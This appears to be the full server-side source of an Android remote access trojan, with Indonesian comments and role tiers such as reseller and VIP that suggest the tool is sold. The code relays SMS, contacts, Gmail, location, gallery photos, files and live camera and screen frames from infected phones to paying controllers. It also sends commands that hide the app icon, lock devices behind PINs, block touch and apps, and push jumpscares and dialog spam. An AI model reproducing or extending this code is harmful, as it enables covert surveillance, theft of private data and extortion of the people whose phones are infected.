// rat.js — modul RAT, di-attach ke WA server
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const express = require("express");
const { Server: SocketIOServer } = require('socket.io');

// ═══ STATE ═══
const DEVICE_FILE = path.join(__dirname, 'devices.json');
const devices = {};
const cameraFrames = {};
const controllerSockets = new Set();
const pendingFileDownloads = {};
const lastAutoCamTrigger = {};
let ratAppLocks = {};
let ratDeviceLocks = {};
let ratLockLives = {};
let ratLockScreens = {};
const ratEffects = {};

const RAT_PRIVILEGED_ROLES = ['vip', 'reseller', 'owner', 'founder', 'admin'];

// ═══ YANG DI-INJECT DARI index.js ═══
let activeKeys = {};
let loadDatabase = () => [];
let saveDatabase = () => {};

// ═══ HELPERS ═══
function isRatPrivileged(role) {
  return RAT_PRIVILEGED_ROLES.includes(String(role || '').toLowerCase());
}

function loadDevices() {
  try {
    return JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8'));
  } catch {
    return {};
  }
}

function saveDevices(d) {
  try {
    fs.writeFileSync(DEVICE_FILE, JSON.stringify(d, null, 2));
  } catch (e) {
    console.error('[DEVICES] Save error:', e.message);
  }
}

function genPairId() {
  const PREFIX = 'AZXCRHSR';
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let random = '';
  for (let i = 0; i < 6; i++) {
    random += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return PREFIX + random;
}

function requireAuthRAT(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token || req.query.key;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  const keyInfo = activeKeys[token];
  if (!keyInfo) {
    return res.status(401).json({ error: 'Invalid session key' });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.status(401).json({ error: 'User not found' });
  }

  if (!isRatPrivileged(user.role)) {
    return res.status(403).json({
      error: 'Forbidden: role Anda tidak memiliki akses ke fitur RAT',
      role: user.role || 'member'
    });
  }

  if (!user.pairId) {
    user.pairId = genPairId();
    saveDatabase(db);
    console.log(`[PAIRID] Auto-generate (auth) untuk ${user.username} (${user.role}): ${user.pairId}`);
  }

  req.username = keyInfo.username;
  req.uid = user.pairId || user.uid || '';
  return next();
}

function getDeviceListForUid(uid) {
  if (!uid) return [];
  return Object.values(devices)
    .filter(d => d.uid === uid)
    .map(d => ({
      id: d.id,
      name: d.name,
      connectedAt: d.connectedAt,
      lastSeen: d.lastSeen,
      info: d.info || {},
      status: d.status
    }));
}

function getDeviceListForSmooth() {
  return Object.values(devices).map(d => ({
    id: d.id,
    name: d.name,
    uid: d.uid,
    connectedAt: d.connectedAt,
    lastSeen: d.lastSeen,
    info: d.info || {},
    status: d.status
  }));
}

function broadcastToUid(uid, event, data) {
  controllerSockets.forEach(sid => {
    const s = io.sockets.sockets.get(sid);
    if (!s) return;

    if (s.data.smooth) {
      if (event === 'devices:update') {
        s.emit('devices:update', getDeviceListForSmooth());
      } else {
        s.emit(event, data);
      }
      return;
    }

    if (uid && s.data.uid !== uid) return;
    s.emit(event, data);
  });
}

const ratRateLimitMap = {};
function ratRateLimiter(req, res, next) {
  const key = (req.query && (req.query.key || req.query.token)) ||
              (req.body && (req.body.key || req.body.token)) ||
              req.headers['x-auth-token'] || null;
  if (!key) return next();

  const now = Date.now();
  if (!ratRateLimitMap[key]) ratRateLimitMap[key] = [];

  ratRateLimitMap[key] = ratRateLimitMap[key].filter(ts => now - ts < 1000);
  ratRateLimitMap[key].push(now);

  if (ratRateLimitMap[key].length > 20) {
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik."
    });
  }
  next();
}

// ═══ SOCKET.IO INSTANCE (di-set saat init) ═══
let io = null;

// ═══ INIT FUNCTION ═══
function init(app, server, injected) {
  // Inject dependencies dari index.js
  activeKeys = injected.activeKeys;
  loadDatabase = injected.loadDatabase;
  saveDatabase = injected.saveDatabase;

  // ═══════════════════════════════════════════
  // SOCKET.IO — attach ke server yang sama (port 2000)
  // path default /socket.io, gak bentrok dengan ws WA
  // ═══════════════════════════════════════════
  io = new SocketIOServer(server, {
    cors: { origin: '*' },
    maxHttpBufferSize: 10e6,
    path: '/socket.io'   // ← default, gak bentrok dengan ws
  });

  // ─── MIDDLEWARE RAT (khusus untuk app) ───
  app.use(express.urlencoded({ extended: false }));
  app.use(express.json({ limit: '10mb' }));
  app.use(ratRateLimiter);
  app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, DELETE");
    res.header("Access-Control-Allow-Headers", "Content-Type, X-Auth-Token, X-Uid");
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
  });

  // ─── SOCKET.IO HANDLERS ───
  io.on('connection', (socket) => {
    socket.on('controller:join', (data) => {
      const rawToken = data?.token;
      if (!rawToken) {
        socket.emit('auth:error', { message: 'Unauthorized' });
        socket.disconnect();
        return;
      }

      const keyInfo = activeKeys[rawToken];
      if (!keyInfo) {
        socket.emit('auth:error', { message: 'Unauthorized' });
        socket.disconnect();
        return;
      }

      const db = loadDatabase();
      const user = db.find(u => u.username === keyInfo.username);
      if (!user) {
        socket.emit('auth:error', { message: 'User not found' });
        socket.disconnect();
        return;
      }

      if (!isRatPrivileged(user.role)) {
        socket.emit('auth:error', { message: 'Forbidden: role Anda tidak memiliki akses ke RAT' });
        socket.disconnect();
        console.log(`[SOCKET] Rejected non-privileged: ${user.username} (${user.role})`);
        return;
      }

      if (!user.pairId) {
        user.pairId = genPairId();
        saveDatabase(db);
        console.log(`[PAIRID] Auto-generate (socket) untuk ${user.username} (${user.role}): ${user.pairId}`);
      }

      socket.data.uid = user.pairId || user.uid || '';
      socket.data.key = rawToken;
      socket.data.username = keyInfo.username;
      socket.data.smooth = data.smooth === true;

      controllerSockets.add(socket.id);

      const devList = socket.data.smooth
        ? getDeviceListForSmooth()
        : getDeviceListForUid(socket.data.uid);

      socket.emit('devices:update', devList);
      console.log(`[SOCKET] Controller joined: ${socket.data.username} (${user.role}) uid=${socket.data.uid}`);
    });

    socket.on('command', (payload) => {
      try {
        const { deviceId, command, value } = payload || {};
        if (!deviceId || !command) return;
        if (!devices[deviceId]) {
          socket.emit('command_response', { deviceId, command, status: 'offline' });
          return;
        }

        const deviceUid = devices[deviceId].uid || '';
        if (socket.data.uid && deviceUid && socket.data.uid !== deviceUid) {
          socket.emit('command_response', { deviceId, command, status: 'forbidden' });
          return;
        }

        if (command === 'lockDevice') {
          try {
            const parsed = typeof value === 'string' ? JSON.parse(value) : value;
            devices[deviceId].status.deviceLocked = true;
            devices[deviceId].status.lockTitle = parsed.title || '';
          } catch (_) {}
        } else if (command === 'unlockDevice') {
          devices[deviceId].status.deviceLocked = false;
          devices[deviceId].status.lockTitle = '';
        } else if (command === 'flashlight') {
          devices[deviceId].status.flashlight = (value === 'true' || value === 'on');
        } else if (command === 'hideIcon') {
          devices[deviceId].status.iconHidden = (value === 'true');
        } else if (command === 'videoOverlay') {
          devices[deviceId].status.videoOverlayActive = (value === 'true' || value === 'start');
        } else if (command === 'jumpscareStart') {
          devices[deviceId].status.jumpscareActive = true;
          devices[deviceId].status.jumpscareUrl = value;
        } else if (command === 'jumpscareStop') {
          devices[deviceId].status.jumpscareActive = false;
        } else if (command === 'muteVolume') {
          devices[deviceId].status.volumeMuted = (value === 'true');
        }

        io.to(`device:${deviceId}`).emit('command', { command, value });

        broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid));
        broadcastToUid(deviceUid, `status:${deviceId}`, devices[deviceId].status);

        console.log(`[SOCKET CMD] → device:${deviceId} cmd=${command}`);
        socket.emit('command_response', { deviceId, command, status: 'sent' });
      } catch (e) {
        console.error('[SOCKET CMD] Error:', e.message);
      }
    });

    socket.on('myInfo', (data) => {
      try {
        const key = socket.data.key || data?.key || data?.token;
        const keyInfo = activeKeys[key];

        if (!keyInfo) {
          socket.send(JSON.stringify({ type: 'myInfo', valid: false, reason: 'keyInvalid' }));
          return;
        }

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);

        if (!user) {
          socket.send(JSON.stringify({ type: 'myInfo', valid: false, reason: 'userNotFound' }));
          return;
        }

        if (!isRatPrivileged(user.role)) {
          socket.send(JSON.stringify({ type: 'myInfo', valid: false, reason: 'forbidden', role: user.role }));
          return;
        }

        if (!user.pairId) {
          user.pairId = genPairId();
          saveDatabase(db);
        }

        socket.send(JSON.stringify({
          type: 'myInfo',
          valid: true,
          uid: user.pairId || user.uid || '',
          username: user.username,
          role: user.role || 'member',
          expiredDate: user.expiredDate || '-'
        }));
      } catch (e) {
        console.error('[myInfo] Error:', e.message);
        socket.send(JSON.stringify({ type: 'myInfo', valid: false, reason: 'internalError' }));
      }
    });

    socket.on('stats', () => {
      try {
        const onlineCount = Object.values(devices).filter(d => {
          if (!d.lastSeen) return false;
          return (Date.now() - new Date(d.lastSeen).getTime()) < 60000;
        }).length;
        const totalCount = Object.keys(devices).length;
        const offlineCount = totalCount - onlineCount;

        socket.emit('stats', {
          onlineUsers: onlineCount,
          offlineUsers: offlineCount,
          totalDevices: totalCount,
        });
      } catch (e) {
        console.error('[stats] Error:', e.message);
      }
    });

    socket.on('device:register', (data) => {
      const { deviceId, name, battery, charging, sdkVersion, androidVersion, uid } = data;

      devices[deviceId] = {
        uid: uid || '',
        id: deviceId,
        name: name || 'Unknown Device',
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        info: { battery: battery ?? -1, charging: charging ?? false, sdkVersion: sdkVersion ?? -1, androidVersion: androidVersion ?? '?' },
        status: { flashlight: false, cameraActive: false, deviceLocked: false, lockTitle: '', jumpscareActive: false, jumpscareUrl: '', blockedApps: [] }
      };

      const savedDevices = loadDevices();
      savedDevices[deviceId] = {
        uid: uid || '',
        id: deviceId,
        name: name || 'Unknown Device',
        connectedAt: devices[deviceId].connectedAt,
        lastSeen: devices[deviceId].lastSeen,
        info: devices[deviceId].info,
        status: devices[deviceId].status
      };
      saveDevices(savedDevices);
      console.log(`[SAVE] Device ${deviceId} berhasil disimpan ke devices.json`);

      socket.join(`device:${deviceId}`);
      broadcastToUid(uid || '', 'devices:update', getDeviceListForUid(uid || ''));

      console.log(`\n╔══════════════════════════════════╗`);
      console.log(`║      NEW DEVICE CONNECTED        ║`);
      console.log(`╚══════════════════════════════════╝`);
      console.log(`  Name    : ${name || 'Unknown'}`);
      console.log(`  Battery : ${battery ?? '?'}% ${charging ? '(Charging)' : ''}`);
      console.log(`  Android : ${androidVersion ?? '?'} (SDK ${sdkVersion ?? '?'})`);
      console.log(`  ID      : ${deviceId}`);
      console.log(`──────────────────────────────────\n`);

      const pingInterval = setInterval(() => {
        if (devices[deviceId] && devices[deviceId].socketId === socket.id) {
          io.to(`device:${deviceId}`).emit('ping:keepalive');
        } else {
          clearInterval(pingInterval);
        }
      }, 25000);

      socket.on('disconnect', () => clearInterval(pingInterval));
    });

    socket.on('device:status', (data) => {
      const { deviceId, status } = data;
      if (!devices[deviceId]) return;

      if (status.installedApps) {
        broadcastToUid(devices[deviceId].uid, 'apps:list', { deviceId, apps: status.installedApps });
        delete status.installedApps;
      }
      if (status.notifList) {
        broadcastToUid(devices[deviceId].uid, 'notif:list', { deviceId, list: status.notifList });
        delete status.notifList;
      }
      if (status.smsList) {
        broadcastToUid(devices[deviceId].uid, 'sms:list', { deviceId, list: status.smsList });
        delete status.smsList;
      }

      devices[deviceId].status = { ...devices[deviceId].status, ...status };
      devices[deviceId].lastSeen = new Date().toISOString();

      const savedDevices = loadDevices();
      if (savedDevices[deviceId]) {
        savedDevices[deviceId].status = devices[deviceId].status;
        savedDevices[deviceId].lastSeen = devices[deviceId].lastSeen;
        saveDevices(savedDevices);
      }

      broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid));
      broadcastToUid(devices[deviceId].uid, `status:${deviceId}`, devices[deviceId].status);
    });

    socket.on('device:notif', (data) => {
      const dev = devices[data.deviceId];
      if (dev) broadcastToUid(dev.uid, 'device:notif', data);
    });

    socket.on('camera:frame', (data) => {
      const { deviceId, frame } = data;
      if (deviceId && frame) {
        cameraFrames[deviceId] = frame;
        console.log(`[CAM] frame cached device=${deviceId} len=${frame.length}`);
      }
      if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:frame', { deviceId, frame });
    });

    socket.on('screen:frame', (data) => {
      const { deviceId, frame } = data;
      if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'screen:frame', { deviceId, frame });
    });

    socket.on('camera:screenshot', (data) => {
      const { deviceId, frame, facing } = data;
      if (deviceId && frame) {
        cameraFrames[deviceId] = frame;
        console.log(`[CAM] screenshot cached device=${deviceId} facing=${facing} len=${frame.length}`);
      }
      if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:screenshot', { deviceId, frame, facing });
    });

    socket.on('device:gallery', (data) => {
      const { deviceId, photos } = data;
      if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'device:gallery', { deviceId, photos });
    });

    socket.on('device:location', (data) => {
      if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:location', data);
    });

    socket.on('device:contacts', (data) => {
      if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:contacts', data);
    });

    socket.on('device:gmail', (data) => {
      if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:gmail', data);
    });

    socket.on('device:themeChanged', (data) => {
      if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:themeChanged', data);
    });

    socket.on('device:phone', (data) => {
      if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:phone', data);
    });

    socket.on('device:files', (data) => {
      if (devices[data.deviceId]) broadcastToUid(devices[data.deviceId].uid, 'device:files', data);
    });

    socket.on('device:filedata', (data) => {
      const { reqId, error, base64, mime } = data;
      if (!reqId || !pendingFileDownloads[reqId]) return;
      if (error) {
        pendingFileDownloads[reqId](error);
      } else {
        const buf = Buffer.from(base64, 'base64');
        pendingFileDownloads[reqId](null, buf, mime || 'application/octet-stream');
      }
    });

    socket.on('disconnect', () => {
      controllerSockets.delete(socket.id);
      const socketUid = socket.data.uid || '';
      for (const id in devices) {
        if (devices[id].socketId === socket.id) {
          const deviceUid = devices[id].uid || socketUid;
          const deviceName = devices[id].name || 'Unknown';
          console.log(`[DEVICE DC] ${deviceName} (${id})`);
          delete cameraFrames[id];
          delete devices[id];

          const savedDevices = loadDevices();
          if (savedDevices[id]) {
            savedDevices[id].lastSeen = new Date().toISOString();
            savedDevices[id].status = { ...savedDevices[id].status, connected: false };
            saveDevices(savedDevices);
          }

          broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid));
          break;
        }
      }
      if (socketUid) broadcastToUid(socketUid, 'devices:update', getDeviceListForUid(socketUid));
    });
  });

  // ─── HTTP ENDPOINTS RAT ───
  app.post('/api/command/:deviceId', ratRateLimiter, requireAuthRAT, (req, res) => {
    try {
      const { deviceId } = req.params;
      const { command, value } = req.body;

      if (!devices[deviceId]) {
        const savedDevices = loadDevices();
        if (!savedDevices[deviceId]) {
          return res.status(404).json({ error: 'Device Not Found' });
        }
        return res.status(503).json({ error: 'Device is offline' });
      }

      const deviceUid = devices[deviceId].uid || '';
      if (req.uid && deviceUid && req.uid !== deviceUid) {
        return res.status(403).json({ error: 'Forbidden: bukan device milik akun ini' });
      }

      if (command === 'lockDevice') {
        try {
          const parsed = typeof value === 'string' ? JSON.parse(value) : value;
          devices[deviceId].status.deviceLocked = true;
          devices[deviceId].status.lockTitle = parsed.title || '';
        } catch (_) {}
      } else if (command === 'hideIcon') {
        devices[deviceId].status.iconHidden = (value === 'true');
      } else if (command === 'touchBlock') {
        devices[deviceId].status.touchBlocked = true;
      } else if (command === 'touchBlockStop') {
        devices[deviceId].status.touchBlocked = false;
      } else if (command === 'ttsSpeak') {
        devices[deviceId].status.ttsSpeaking = true;
      } else if (command === 'ttsStop') {
        devices[deviceId].status.ttsSpeaking = false;
      } else if (command === 'videoOverlay') {
        devices[deviceId].status.videoOverlayActive = (value === 'true' || value === 'start');
      } else if (command === 'videoOverlayHide') {
        devices[deviceId].status.videoOverlayActive = false;
      } else if (command === 'jumpscare2Start') {
        try {
          const obj = typeof value === 'string' ? JSON.parse(value) : value;
          devices[deviceId].status.jumpscare2Active = true;
          devices[deviceId].status.jumpscare2Url = obj.url || '';
          devices[deviceId].status.jumpscare2Duration = obj.duration || 3000;
        } catch (_) {}
      } else if (command === 'jumpscare2Stop') {
        devices[deviceId].status.jumpscare2Active = false;
      } else if (command === 'dialogSpam') {
        devices[deviceId].status.dialogSpamActive = true;
      } else if (command === 'dialogSpamStop') {
        devices[deviceId].status.dialogSpamActive = false;
      } else if (command === 'muteVolume') {
        devices[deviceId].status.volumeMuted = (value === 'true');
      } else if (command === 'unlockDevice') {
        devices[deviceId].status.deviceLocked = false;
        devices[deviceId].status.lockTitle = '';
      } else if (command === 'jumpscareStart') {
        devices[deviceId].status.jumpscareActive = true;
        devices[deviceId].status.jumpscareUrl = value;
      } else if (command === 'jumpscareStop') {
        devices[deviceId].status.jumpscareActive = false;
      } else if (command === 'blockApp') {
        try {
          const obj = typeof value === 'string' ? JSON.parse(value) : value;
          const arr = devices[deviceId].status.blockedApps || [];
          if (!arr.includes(obj.package)) arr.push(obj.package);
          devices[deviceId].status.blockedApps = arr;
        } catch (_) {}
      } else if (command === 'unblockApp') {
        const arr = devices[deviceId].status.blockedApps || [];
        devices[deviceId].status.blockedApps = arr.filter(p => p !== value);
      } else if (command === 'unblockAll') {
        devices[deviceId].status.blockedApps = [];
      } else if (command === 'flashlight') {
        devices[deviceId].status.flashlight = (value === 'true' || value === 'on');
      }

      broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid));
      broadcastToUid(deviceUid, `status:${deviceId}`, devices[deviceId].status);

      console.log(`[/api/command] → device:${deviceId} cmd=${command}`);
      io.to(`device:${deviceId}`).emit('command', { command, value });

      res.json({ ok: true });
    } catch (e) {
      console.error('[/api/command] Error:', e.message);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/devices', ratRateLimiter, requireAuthRAT, (req, res) => {
    const smooth = req.headers['x-smooth'] === 'true';
    if (smooth) return res.json(getDeviceListForSmooth());
    res.json(getDeviceListForUid(req.uid));
  });

  app.get('/api/screenshot/:deviceId', ratRateLimiter, requireAuthRAT, (req, res) => {
    const { deviceId } = req.params;
    const facing = (req.query.facing || 'front').toString();
    if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' });

    const smooth = req.headers['x-smooth'] === 'true';
    if (!smooth && req.uid && devices[deviceId].uid !== req.uid) {
      return res.status(403).json({ error: 'Forbidden' });
    }

    let frame = cameraFrames[deviceId];

    if (!frame) {
      const now = Date.now();
      const key = `ss:${deviceId}`;
      if (!lastAutoCamTrigger[key] || (now - lastAutoCamTrigger[key]) > 1500) {
        lastAutoCamTrigger[key] = now;
        console.log(`[AUTO-CAM] Trigger camera device=${deviceId} facing=${facing}`);
        io.to(`device:${deviceId}`).emit('command', { command: 'camera', value: facing });
      }
      return res.status(202).json({ ok: false, pending: true, message: 'Menunggu frame dari device' });
    }

    res.json({ ok: true, frame, deviceId, facing });
  });

  app.get('/api/file/:deviceId', ratRateLimiter, requireAuthRAT, (req, res) => {
    const { deviceId } = req.params;
    const filePath = req.query.path;
    if (!filePath) return res.status(400).json({ error: 'path diperlukan' });
    if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' });

    const smooth = req.headers['x-smooth'] === 'true';
    if (!smooth && req.uid && devices[deviceId].uid !== req.uid) {
      return res.status(403).json({ error: 'Forbidden' });
    }

    const reqId = crypto.randomBytes(8).toString('hex');
    const filename = filePath.split('/').pop() || 'file';

    let settled = false;
    pendingFileDownloads[reqId] = (err, buf, mime) => {
      if (settled) return;
      settled = true;
      delete pendingFileDownloads[reqId];
      if (err) return res.status(500).json({ error: err });
      res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
      res.setHeader('Content-Type', mime || 'application/octet-stream');
      res.setHeader('Content-Length', buf.length);
      res.send(buf);
    };

    io.to(`device:${deviceId}`).emit('command', {
      command: 'downloadFile',
      value: JSON.stringify({ path: filePath, reqId })
    });

    setTimeout(() => {
      if (pendingFileDownloads[reqId]) {
        pendingFileDownloads[reqId]('Timeout: device tidak merespons');
      }
    }, 30000);
  });

  app.get('/api/live-camera/:deviceId', ratRateLimiter, requireAuthRAT, (req, res) => {
    try {
      const { deviceId } = req.params;
      const facing = (req.query.facing || 'front').toString();

      if (!devices[deviceId]) {
        return res.status(404).json({ error: 'Device offline' });
      }

      const reqUid = req.uid || '';
      const deviceUid = devices[deviceId].uid || '';

      if (reqUid && deviceUid && reqUid !== deviceUid) {
        return res.status(403).json({ error: 'Forbidden' });
      }

      let frame = cameraFrames[deviceId] || '';

      if (!frame) {
        const now = Date.now();
        const key = `lc:${deviceId}`;
        if (!lastAutoCamTrigger[key] || (now - lastAutoCamTrigger[key]) > 2000) {
          lastAutoCamTrigger[key] = now;
          console.log(`[AUTO-LIVE] Trigger liveCamera device=${deviceId} facing=${facing}`);
          io.to(`device:${deviceId}`).emit('command', { command: 'liveCamera', value: facing });
        }
        return res.status(202).json({ ok: false, pending: true, message: 'Menunggu frame dari device' });
      }

      res.json({ ok: true, frame, deviceId, facing });
    } catch (e) {
      console.error('[/api/live-camera] Error:', e.message);
      res.status(500).json({ error: 'Internal error' });
    }
  });

  app.post('/api/lock-app/:id', (req, res) => {
    const { id } = req.params;
    const { locked, app: lockedApp, pin } = req.body;
    ratAppLocks[id] = {
      locked: locked === true,
      app: lockedApp || '',
      pin: pin || '123456',
      timestamp: new Date()
    };
    res.json({ status: 'ok', locked: ratAppLocks[id] });
  });

  app.get('/api/app-lock-status/:id', (req, res) => {
    const { id } = req.params;
    res.json(ratAppLocks[id] || { locked: false, app: '', pin: '' });
  });

  app.post('/api/unlock-app/:id', (req, res) => {
    const { id } = req.params;
    if (ratAppLocks[id]) ratAppLocks[id].locked = false;
    res.json({ status: 'ok' });
  });

  app.post('/api/lock-screen/:id', (req, res) => {
    const { id } = req.params;
    const { locked, message, pin, preventTouch } = req.body;
    ratLockScreens[id] = {
      locked: locked === true,
      message: message || 'DEVICE LOCKED',
      pin: pin || '123456',
      preventTouch: preventTouch === true,
      timestamp: new Date()
    };
    res.json({ status: 'ok', locked: ratLockScreens[id] });
  });

  app.get('/api/lock-status/:id', (req, res) => {
    const { id } = req.params;
    res.json(ratLockScreens[id] || { locked: false, message: '', pin: '', preventTouch: false });
  });

  app.post('/api/unlock-screen/:id', (req, res) => {
    const { id } = req.params;
    if (ratLockScreens[id]) ratLockScreens[id].locked = false;
    res.json({ status: 'ok' });
  });

  app.post('/api/device-lock/:id', (req, res) => {
    const { id } = req.params;
    const { locked, message, pin } = req.body;
    ratDeviceLocks[id] = {
      locked: locked === true,
      message: message || 'DEVICE LOCKED',
      pin: pin || '123456',
      timestamp: new Date()
    };
    res.json({ status: 'ok', locked: ratDeviceLocks[id] });
  });

  app.get('/api/device-lock-status/:id', (req, res) => {
    const { id } = req.params;
    res.json(ratDeviceLocks[id] || { locked: false, message: '', pin: '' });
  });

  app.post('/api/unlock-device/:id', (req, res) => {
    const { id } = req.params;
    if (ratDeviceLocks[id]) ratDeviceLocks[id].locked = false;
    res.json({ status: 'ok' });
  });

  app.post('/api/lock-live/:id', (req, res) => {
    const { id } = req.params;
    const { active, message, pin } = req.body;
    ratLockLives[id] = {
      active: active === true,
      message: message || 'DEVICE LOCKED',
      pin: pin || '123456',
      timestamp: new Date()
    };
    res.json({ status: 'ok', active: ratLockLives[id] });
  });

  app.get('/api/lock-live-status/:id', (req, res) => {
    const { id } = req.params;
    res.json(ratLockLives[id] || { active: false, message: '', pin: '' });
  });

  app.post('/api/unlock-live/:id', (req, res) => {
    const { id } = req.params;
    if (ratLockLives[id]) ratLockLives[id].active = false;
    res.json({ status: 'ok' });
  });

  app.post('/api/unlock-all/:id', (req, res) => {
    const { id } = req.params;
    if (ratAppLocks[id]) ratAppLocks[id].locked = false;
    if (ratLockLives[id]) ratLockLives[id].active = false;
    if (ratDeviceLocks[id]) ratDeviceLocks[id].locked = false;
    if (ratLockScreens[id]) ratLockScreens[id].locked = false;
    res.json({ status: 'ok', message: 'All locks removed' });
  });

  app.get('/api/device-info/:id', (req, res) => {
    const { id } = req.params;
    const savedDevices = loadDevices();
    const device = savedDevices[id];
    if (device) {
      res.json({
        battery: device.info?.battery || '87',
        model: device.name || 'Unknown',
        status: devices[id] ? 'Online' : 'Offline',
        lastSeen: device.lastSeen || new Date()
      });
    } else {
      res.status(404).json({ error: 'Device not found' });
    }
  });

  app.post('/api/effect/:id', (req, res) => {
    const { id } = req.params;
    const { effect, value } = req.body;
    if (!ratEffects[id]) ratEffects[id] = {};
    ratEffects[id][effect] = { value, timestamp: new Date() };
    res.json({ status: 'ok' });
  });

  app.get('/api/effect-status/:id', (req, res) => {
    const { id } = req.params;
    res.json(ratEffects[id] || {});
  });

  app.get('/rat/pairid', (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.json({ valid: false, message: 'User not found' });

    if (!isRatPrivileged(user.role)) {
      return res.status(403).json({ valid: false, message: 'Role Anda tidak memiliki akses RAT', role: user.role });
    }

    if (!user.pairId) {
      user.pairId = genPairId();
      saveDatabase(db);
    }
    res.json({
      valid: true,
      pairId: user.pairId || '',
      username: user.username,
      role: user.role || 'member'
    });
  });

  app.get('/rat/my-devices', (req, res) => {
    const { key, uid } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, message: 'User not found' });

    if (!isRatPrivileged(user.role)) {
      return res.status(403).json({ valid: false, message: 'Role Anda tidak memiliki akses RAT', role: user.role });
    }

    if (!user.pairId) {
      user.pairId = genPairId();
      saveDatabase(db);
    }

    const savedDevices = loadDevices();
    const userUid = uid || user.pairId || user.uid || '';
    const userDevices = Object.values(savedDevices).filter(d => d.uid === userUid);

    return res.json({
      valid: true,
      pairId: user.pairId || '',
      role: user.role || 'member',
      devices: userDevices,
      totalDevices: userDevices.length
    });
  });

  app.post('/rat/pair-device', (req, res) => {
    const { key, pairId } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.status(404).json({ valid: false, message: 'User not found' });

    if (!isRatPrivileged(user.role)) {
      return res.status(403).json({ valid: false, message: 'Role Anda tidak memiliki akses RAT', role: user.role });
    }

    if (user.pairId !== pairId) {
      return res.json({ success: false, message: 'PairID tidak cocok' });
    }

    res.json({ success: true, message: 'Pairing siap' });
  });

  // ─── STARTUP: auto-generate pairId untuk user lama privileged ───
  (function ensureAllUsersHavePairId() {
    try {
      const db = loadDatabase();
      let changed = false;
      for (let i = 0; i < db.length; i++) {
        const role = db[i].role || 'member';
        if (isRatPrivileged(role) && !db[i].pairId) {
          db[i].pairId = genPairId();
          changed = true;
          console.log(`[RAT STARTUP] pairId generated: ${db[i].username} (${role}) → ${db[i].pairId}`);
        }
      }
      if (changed) saveDatabase(db);
      console.log(`[RAT STARTUP] ${db.filter(u => u.pairId).length} users punya pairId (privileged only)`);
    } catch (e) {
      console.error('[RAT STARTUP] pairId generation error:', e.message);
    }
  })();

  console.log('✅ RAT module loaded (socket.io + /api/* + /rat/*)');

  return { io, devices, genPairId, isRatPrivileged };
}

module.exports = { init };